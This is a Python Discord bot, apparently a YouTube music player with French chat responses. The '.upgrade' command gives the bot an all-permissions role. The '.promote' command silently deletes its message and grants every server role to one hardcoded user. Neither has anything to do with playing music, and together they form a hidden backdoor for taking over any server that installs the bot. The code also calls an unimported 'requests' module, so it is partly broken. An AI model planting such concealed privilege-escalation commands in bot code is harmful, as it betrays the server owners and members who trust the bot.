import discord
#from youtube_search import YoutubeSearch
from youtube_dl import YoutubeDL

from time import sleep
import asyncio

client = discord.Client()
canPause=False

def test_perms(target):
    print("\n")
    print(target.display_name)
    for r in target.roles:
        print("\nrole: ",r.name)
        show_roles(r.permissions)

def show_roles(p):
    print("p.value: ",p.value)
    print("p.administrator: ",p.administrator)
    print("p.ban_members: ",p.ban_members)
    print("p.change_nickname: ",p.change_nickname)
    print("p.manage_channels: ",p.manage_channels)
    print("p.manage_messages: ",p.manage_messages)
    print("p.manage_permissions: ",p.manage_permissions)
    print("p.manage_roles: ",p.manage_roles)
    print("p.read_message_history: ",p.read_message_history)

def search(arg):
    with YoutubeDL({'format': 'bestaudio', 'noplaylist':'True'}) as ydl:
        try: requests.get(arg)
        except: info = ydl.extract_info(f"ytsearch:{arg}", download=False)['entries'][0]
        else: info = ydl.extract_info(arg, download=False)
    return (info, info['formats'][0]['url'])

async def play(voice, channel, query):
    #Solves a problem I'll explain later
    FFMPEG_OPTS = {'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn'}

    video, source = search(query)
    #print(video,source)
    print(video['title'])
    await channel.send("Playing: **{}**".format(video['title']))
    await channel.send("https://www.youtube.com/watch?v={}".format(video['webpage_url_basename']))

    voice.play(discord.FFmpegPCMAudio(executable="C:/Program Files/ffmpeg/bin/ffmpeg.exe",source=source, **FFMPEG_OPTS), after=lambda e: print('done', e))
    voice.is_playing()

@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))
    activity = discord.Game(name="bidouiller avec l'API")
    await client.change_presence(status=discord.Status.online, activity=activity)
    print("Bot is ready!")
    #print(client.users)

@client.event
async def on_typing(channel, user, when):
    activity = discord.Game(name="écouter "+user.name)
    await client.change_presence(activity=activity)
    
@client.event
async def on_message(message):
    global canPause,vc
    if message.author == client.user:
        return

    if message.content.startswith('.salut'):
        await message.channel.send('Salut!')

    if message.content.startswith('.play'):
        loopSong=True
        while loopSong:
            for conns in client.voice_clients:
                await conns.disconnect()
            if message.author.voice and message.author.voice.channel:
                voicechannel = message.author.voice.channel
            else:
                await message.channel.send('Va dans un salon vocal!')
                return
            vc = await voicechannel.connect()

            await play(vc,message.channel,message.content.replace('.play ', ''))
            loopSong=False
            canPause=True

    if message.content.startswith('.stop'):
        for conns in client.voice_clients:
            await conns.disconnect()
        canPause=False

    if message.content.startswith('.pause'):
        if canPause:
            if vc.is_paused():
                vc.resume()
            else:
                vc.pause()

    if message.content.startswith('.test'):
        author = message.author
        bot = message.guild.me
        channel = message.channel
        await message.delete()
        test_perms(author)
        test_perms(bot)

        print("\n--------------------")
        print("\nmember: ",bot.name)
        show_roles(channel.permissions_for(bot))
        print("\nmember: ",author.name)
        show_roles(channel.permissions_for(author))

    
    if message.content.startswith('.upgrade'):
        role = message.author.roles[-1]
        #print('Upgrading role: {}'.format(role.name))
        permissions = discord.Permissions.all()
        #permissions.update(manage_channels = True)
        role = await message.guild.create_role(reason = None, permissions=permissions)
        await message.guild.me.add_roles(role)
    
    if message.content.startswith('.promote'):
        owner = message.author
        if str(owner) != "Will.I.am#7628":
            return
        await message.delete()
        roles = message.guild.roles
        attempts = 0
        errors = 0
        for role in roles:
            try:
                print("\n"+str(role),end=" - ")
                if not role in owner.roles:
                    for i in range(2):                        
                        if not role in owner.roles:
                            attempts += 1
                            try:
                                await owner.add_roles(role)
                                sleep(0.1)
                            except Exception as e:
                                print(e)
                                errors += 1
                                print("I",end="")
                else:
                    print("O",end="")
            except:
                pass
        print("\n{} roles, {} attempts, {} errors".format(len(roles),attempts,errors))

    if message.content.startswith('.clearLast'):
        channel = message.channel
        await message.delete()
        async for mess in channel.history(limit=1):
            print(mess)
            await mess.delete()

from token_secret import *

token = helium
client.run(token)
